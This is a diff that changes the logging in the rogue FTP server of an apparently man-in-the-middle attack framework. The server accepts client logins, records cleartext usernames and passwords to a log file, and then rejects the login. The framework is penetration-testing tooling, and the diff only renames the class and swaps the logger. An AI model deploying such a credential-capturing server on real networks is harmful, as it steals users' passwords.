@@ -6,20 +6,22 @@ from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
 from core.responder.packet import Packet
 from core.responder.odict import OrderedDict
 from core.responder.common import *
+from core.logger import logger
 
-mitmf_logger = logging.getLogger("mitmf")
+formatter = logging.Formatter("%(asctime)s [FTPserver] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+log = logger().setup_logger("FTPserver", formatter)
 
-class FTPServer():
+class FTPserver():
 	
 	def start(self):
 		try:
-			mitmf_logger.debug("[FTPServer] online")
+			log.debug("online")
 			server = ThreadingTCPServer(("0.0.0.0", 21), FTP)
-			t = threading.Thread(name="FTPServer", target=server.serve_forever)
+			t = threading.Thread(name="FTPserver", target=server.serve_forever)
 			t.setDaemon(True)
 			t.start()
 		except Exception, e:
-			mitmf_logger.error("[FTPServer] Error starting on port {}: {}".format(21, e))
+			log.error("Error starting on port {}: {}".format(21, e))
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
@@ -45,7 +47,7 @@ class FTP(BaseRequestHandler):
 			data = self.request.recv(1024)
 			if data[0:4] == "USER":
 				User = data[5:].replace("\r\n","")
-				mitmf_logger.info('[FTPServer] {} FTP User: {}'.format(self.client_address[0], User))
+				log.info('{} FTP User: {}'.format(self.client_address[0], User))
 				t = FTPPacket(Code="331",Message="User name okay, need password.")
 				self.request.send(str(t))
 				data = self.request.recv(1024)
@@ -53,7 +55,7 @@ class FTP(BaseRequestHandler):
 				Pass = data[5:].replace("\r\n","")
 				Outfile = "./logs/responder/FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
 				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
-				mitmf_logger.info('[FTPServer] {} FTP Password is: {}'.format(self.client_address[0], Pass))
+				log.info('{} FTP Password is: {}'.format(self.client_address[0], Pass))
 				t = FTPPacket(Code="530",Message="User not logged in.")
 				self.request.send(str(t))
 				data = self.request.recv(1024)
@@ -62,4 +64,4 @@ class FTP(BaseRequestHandler):
 				self.request.send(str(t))
 				data = self.request.recv(1024)
 		except Exception as e:
-			mitmf_logger.error("[FTPServer] Error handling request: {}".format(e))
+			log.error("Error handling request: {}".format(e))
